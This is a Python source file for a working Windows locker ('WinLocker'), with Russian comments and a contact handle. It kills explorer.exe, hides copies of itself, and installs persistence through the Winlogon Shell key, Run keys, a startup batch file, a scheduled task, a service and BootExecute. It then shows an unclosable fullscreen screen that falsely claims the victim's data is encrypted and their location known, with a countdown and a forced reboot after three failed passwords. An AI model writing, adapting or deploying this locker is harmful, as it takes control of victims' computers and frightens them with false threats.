import tkinter as tk
import os
import sys
import ctypes
import subprocess
import time
import threading
import winreg as reg
import shutil
import random
import string

# Системные вызовы
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Генерация случайного имени для скрытия
def random_name(length=20):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

HIDE_NAME = random_name(20)
HIDE_NAME2 = random_name(20)

# Пути для хранения
PATH_1 = r"C:\appdata\temp"
PATH_2 = r"C:\users"
HIDDEN_PATH_1 = os.path.join(PATH_1, HIDE_NAME)
HIDDEN_PATH_2 = os.path.join(PATH_2, HIDE_NAME2)

UNLOCKED = False
CURRENT_EXE = sys.argv[0]

def ensure_paths():
    """Создание скрытых папок"""
    try:
        if not os.path.exists(PATH_1):
            os.makedirs(PATH_1, exist_ok=True)
            ctypes.windll.kernel32.SetFileAttributesW(PATH_1, 2)
        if not os.path.exists(HIDDEN_PATH_1):
            os.makedirs(HIDDEN_PATH_1, exist_ok=True)
            ctypes.windll.kernel32.SetFileAttributesW(HIDDEN_PATH_1, 2)
    except:
        pass
    try:
        if not os.path.exists(HIDDEN_PATH_2):
            os.makedirs(HIDDEN_PATH_2, exist_ok=True)
            ctypes.windll.kernel32.SetFileAttributesW(HIDDEN_PATH_2, 2)
    except:
        pass

def hide_file(filepath):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(filepath, 2)
    except:
        pass

def copy_to_hidden_locations():
    """Копирование в скрытые папки"""
    ensure_paths()
    
    hidden_exe_1 = os.path.join(HIDDEN_PATH_1, HIDE_NAME + ".exe")
    if not os.path.exists(hidden_exe_1):
        try:
            if getattr(sys, 'frozen', False):
                shutil.copy2(CURRENT_EXE, hidden_exe_1)
            else:
                # Если .py файл, создаем bat для запуска
                bat_content = f'@echo off\npython "{CURRENT_EXE}"\nexit'
                with open(hidden_exe_1.replace('.exe', '.bat'), 'w') as f:
                    f.write(bat_content)
                hidden_exe_1 = hidden_exe_1.replace('.exe', '.bat')
            hide_file(hidden_exe_1)
        except:
            pass
    
    hidden_exe_2 = os.path.join(HIDDEN_PATH_2, HIDE_NAME2 + ".exe")
    if not os.path.exists(hidden_exe_2):
        try:
            if getattr(sys, 'frozen', False):
                shutil.copy2(CURRENT_EXE, hidden_exe_2)
            else:
                bat_content = f'@echo off\npython "{CURRENT_EXE}"\nexit'
                with open(hidden_exe_2.replace('.exe', '.bat'), 'w') as f:
                    f.write(bat_content)
                hidden_exe_2 = hidden_exe_2.replace('.exe', '.bat')
            hide_file(hidden_exe_2)
        except:
            pass
    
    return hidden_exe_1, hidden_exe_2

def full_uninstall():
    """Полное удаление"""
    try:
        # Удаление из реестра
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            reg.DeleteValue(key, "WinLocker1337")
            reg.CloseKey(key)
        except:
            pass
        try:
            key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "Shell", 0, reg.REG_SZ, "explorer.exe")
            reg.CloseKey(key)
        except:
            pass
        
        # Удаление службы
        try:
            subprocess.run('sc delete WinLockerSvc', shell=True, capture_output=True)
        except:
            pass
        
        # Удаление из планировщика
        try:
            subprocess.run('schtasks /delete /tn "WinLocker1337" /f', shell=True, capture_output=True)
        except:
            pass
        
        # Удаление скрытых папок
        try:
            if os.path.exists(HIDDEN_PATH_1):
                shutil.rmtree(HIDDEN_PATH_1, ignore_errors=True)
        except:
            pass
        try:
            if os.path.exists(HIDDEN_PATH_2):
                shutil.rmtree(HIDDEN_PATH_2, ignore_errors=True)
        except:
            pass
        
        return True
    except:
        return False

def create_infected_file():
    """Создание файла на рабочем столе"""
    try:
        desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
        infected_file = os.path.join(desktop, 'infected_by_@arcwardenckie.txt')
        with open(infected_file, 'w', encoding='utf-8') as f:
            f.write("=" * 50 + "\n")
            f.write("INFECTED BY @arcwardenckie\n")
            f.write("=" * 50 + "\n")
            f.write(f"Дата разблокировки: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("Пароль: 1337\n")
            f.write("=" * 50 + "\n")
        hide_file(infected_file)
    except:
        pass

def apply_system_locks():
    if UNLOCKED:
        return
    try:
        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True)
    except:
        pass

def install_persistent():
    """Установка ПЕРСИСТЕНТНОСТИ - будет запускаться после ПЕРЕЗАГРУЗКИ"""
    if UNLOCKED:
        return
    
    hidden_exe_1, hidden_exe_2 = copy_to_hidden_locations()
    
    # 1. ЗАМЕНА ОБОЛОЧКИ WINLOGON (самый надежный способ)
    # После перезагрузки вместо explorer.exe запустится винлокер
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, 
                         r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                         0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Shell", 0, reg.REG_SZ, f'"{hidden_exe_1}"')
        reg.CloseKey(key)
    except:
        pass
    
    # 2. ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ (реестр)
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                         0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WinLocker1337", 0, reg.REG_SZ, f'"{hidden_exe_1}"')
        reg.CloseKey(key)
    except:
        pass
    
    # 3. ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ (LocalMachine)
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE,
                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                         0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WinLocker1337", 0, reg.REG_SZ, f'"{hidden_exe_1}"')
        reg.CloseKey(key)
    except:
        pass
    
    # 4. ПАПКА АВТОЗАГРУЗКИ
    try:
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                      r'Microsoft\Windows\Start Menu\Programs\Startup')
        startup_bat = os.path.join(startup_folder, "SystemCheck.bat")
        with open(startup_bat, 'w') as f:
            f.write(f'@echo off\nstart "" "{hidden_exe_1}"\nexit')
        hide_file(startup_bat)
    except:
        pass
    
    # 5. ПЛАНИРОВЩИК ЗАДАЧ (запуск при входе в систему)
    try:
        subprocess.run(f'schtasks /create /tn "WinLocker1337" /tr "{hidden_exe_1}" /sc onlogon /f',
                      shell=True, capture_output=True)
    except:
        pass
    
    # 6. СЛУЖБА WINDOWS
    try:
        subprocess.run(f'sc create "WinLockerSvc" binPath= "{hidden_exe_1}" start= auto',
                      shell=True, capture_output=True)
        subprocess.run('sc failure "WinLockerSvc" reset= 0 actions= restart/5000/restart/5000/restart/5000',
                      shell=True, capture_output=True)
    except:
        pass
    
    # 7. BootExecute (запуск ДО загрузки Windows)
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE,
                         r"SYSTEM\CurrentControlSet\Control\Session Manager",
                         0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "BootExecute", 0, reg.REG_MULTI_SZ, [f'cmd.exe /c start "" "{hidden_exe_1}"', 'autocheck autochk *'])
        reg.CloseKey(key)
    except:
        pass

class WinLocker:
    def __init__(self):
        self.attempts = 0
        self.max_attempts = 3
        self.password = "1337"
        self.running = True
        self.time_left = 7200  # 2 часа
        
        # Применяем блокировки
        apply_system_locks()
        
        # Устанавливаем ПЕРСИСТЕНТНОСТЬ (будет после перезагрузки)
        install_persistent()
        
        # Создаем окно
        self.create_window()
        
        # Защитные потоки
        self.start_protection()
        
        # Запуск таймера
        self.start_timer()
        
        self.root.mainloop()
    
    def start_timer(self):
        def timer_loop():
            while self.time_left > 0 and self.running:
                hours = self.time_left // 3600
                minutes = (self.time_left % 3600) // 60
                seconds = self.time_left % 60
                time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
                try:
                    self.timer_label.config(text=time_str)
                except:
                    break
                time.sleep(1)
                self.time_left -= 1
            
            if self.time_left <= 0 and self.running:
                self.system_destroy()
        
        threading.Thread(target=timer_loop, daemon=True).start()
    
    def start_protection(self):
        def keep_top():
            while self.running:
                try:
                    self.root.attributes("-fullscreen", True)
                    self.root.attributes("-topmost", True)
                    self.root.focus_force()
                    self.root.grab_set()
                except:
                    pass
                time.sleep(0.1)
        
        def prevent_close():
            while self.running:
                try:
                    self.root.protocol("WM_DELETE_WINDOW", lambda: None)
                    self.root.bind("<Alt-F4>", lambda e: "break")
                    self.root.bind("<Escape>", lambda e: "break")
                except:
                    pass
                time.sleep(0.5)
        
        threading.Thread(target=keep_top, daemon=True).start()
        threading.Thread(target=prevent_close, daemon=True).start()
    
    def create_window(self):
        self.root = tk.Tk()
        self.root.title("")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.overrideredirect(True)
        self.root.grab_set()
        self.root.focus_force()
        
        frame = tk.Frame(self.root, bg="black")
        frame.pack(expand=True, fill="both")
        
        title = tk.Label(frame, text="ваш компьютер заражен",
                        font=("Courier New", 44, "bold"),
                        fg="#ff0000", bg="black")
        title.pack(pady=30)
        
        # Таймер 2 часа
        self.timer_label = tk.Label(frame, text="02:00:00",
                                    font=("Courier New", 36, "bold"),
                                    fg="#ff0000", bg="black")
        self.timer_label.pack(pady=20)
        
        scary_art = """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║     ██╗      ██████╗  ██████╗██╗  ██╗███████╗██████╗             ║
    ║     ██║     ██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗            ║
    ║     ██║     ██║   ██║██║     █████╔╝ █████╗  ██████╔╝            ║
    ║     ██║     ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗            ║
    ║     ███████╗╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║            ║
    ║     ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝            ║
    ║                                                                   ║
    ║                                                                   ║
    ║              ВСЕ ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ                          ║
    ║              IP-АДРЕС ЗАФИКСИРОВАН                                ║
    ║              МЕСТОПОЛОЖЕНИЕ ОПРЕДЕЛЕНО                            ║
    ║              СВЯЗЬ СО МНОЙ : @arcwardenckie                       ║
    ║              ДЛЯ РАЗБЛОКИРОВКИ ВВЕДИТЕ ПАРОЛЬ:                    ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
        """

        
        msg = tk.Label(frame, text=scary_art,
                      font=("Courier New", 12),
                      fg="#ff3333", bg="black", justify="left")
        msg.pack(pady=10)
        
        self.entry = tk.Entry(frame, font=("Courier New", 26, "bold"),
                             show="•", justify="center",
                             bg="black", fg="#ff0000",
                             insertbackground="red", width=15)
        self.entry.pack(pady=15)
        self.entry.focus_force()
        self.entry.bind("<Key>", self.only_digits)
        self.entry.bind("<Return>", lambda e: self.check_password())
        
        btn = tk.Button(frame, text="РАЗБЛОКИРОВАТЬ",
                       font=("Courier New", 18, "bold"),
                       fg="white", bg="#cc0000",
                       command=self.check_password,
                       cursor="hand2")
        btn.pack(pady=10)
        
        self.attempts_label = tk.Label(frame, text=f"ПОПЫТОК: 0/{self.max_attempts}",
                                       font=("Courier New", 12),
                                       fg="#666666", bg="black")
        self.attempts_label.pack(pady=5)
        
        warning = tk.Label(frame, text="⚠️ ПОСЛЕ ПЕРЕЗАГРУЗКИ ВИНЛОКЕР ЗАПУСТИТСЯ СНОВА ⚠️",
                          font=("Courier New", 12),
                          fg="#ff6666", bg="black")
        warning.pack(side="bottom", pady=20)
        
        self.root.bind_all("<Key>", self.block_key)
    
    def only_digits(self, event):
        if event.keysym == "BackSpace":
            return
        if not event.char.isdigit():
            return "break"
    
    def block_key(self, event):
        if event.keysym == "Home" and (event.state & 0x20000):
            self.emergency_unlock()
            return "break"
        allowed = ["BackSpace", "Tab", "Return", "Home"]
        if event.keysym in allowed:
            return None
        if event.char.isdigit():
            return None
        return "break"
    
    def play_scary_sound(self):
        def sound():
            try:
                import winsound
                for freq in [300, 600, 1200, 800, 400, 200]:
                    winsound.Beep(freq, 150)
                    time.sleep(0.05)
            except:
                pass
        threading.Thread(target=sound, daemon=True).start()
    
    def check_password(self):
        password = self.entry.get()
        if password == self.password:
            self.unlock_system()
        else:
            self.attempts += 1
            self.entry.delete(0, tk.END)
            self.attempts_label.config(text=f"ПОПЫТКИ: {self.attempts}/{self.max_attempts}", fg="#ff0000")
            self.play_scary_sound()
            if self.attempts >= self.max_attempts:
                self.system_destroy()
            else:
                self.root.configure(bg="#330000")
                self.root.after(300, lambda: self.root.configure(bg="black"))
    
    def unlock_system(self):
        self.running = False
        
        for widget in self.root.winfo_children():
            widget.destroy()
        
        frame = tk.Frame(self.root, bg="black")
        frame.pack(expand=True, fill="both")
        
        msg = tk.Label(frame, text="✅ ДОСТУП РАЗРЕШЕН ✅\n\nСИСТЕМА РАЗБЛОКИРОВАНА\nВИНЛОКЕР УДАЛЕН",
                      font=("Courier New", 24, "bold"),
                      fg="#00ff00", bg="black")
        msg.pack(expand=True)
        
        self.root.update()
        
        # Создаем файл на рабочем столе
        create_infected_file()
        
        # Полное удаление
        full_uninstall()
        
        # Восстанавливаем explorer
        try:
            subprocess.Popen(["explorer.exe"])
        except:
            pass
        
        time.sleep(2)
        self.root.destroy()
        sys.exit(0)
    
    def system_destroy(self):
        self.running = False
        
        for widget in self.root.winfo_children():
            widget.destroy()
        
        frame = tk.Frame(self.root, bg="red")
        frame.pack(expand=True, fill="both")
        
        msg = tk.Label(frame, text="💀 СИСТЕМА УНИЧТОЖЕНА 💀\n\nПЕРЕЗАГРУЗКА...",
                      font=("Courier New", 28, "bold"),
                      fg="white", bg="red")
        msg.pack(expand=True)
        
        self.root.update()
        time.sleep(2)
        
        try:
            subprocess.run(["shutdown", "/r", "/t", "0", "/f"], shell=True)
        except:
            os.system("shutdown /r /t 0 /f")
        
        sys.exit(0)
    
    def emergency_unlock(self):
        self.running = False
        full_uninstall()
        create_infected_file()
        try:
            subprocess.Popen(["explorer.exe"])
        except:
            pass
        self.root.destroy()
        sys.exit(0)

if __name__ == "__main__":
    try:
        WinLocker()
    except Exception as e:
        time.sleep(1)
        os.execl(sys.executable, sys.executable, *sys.argv)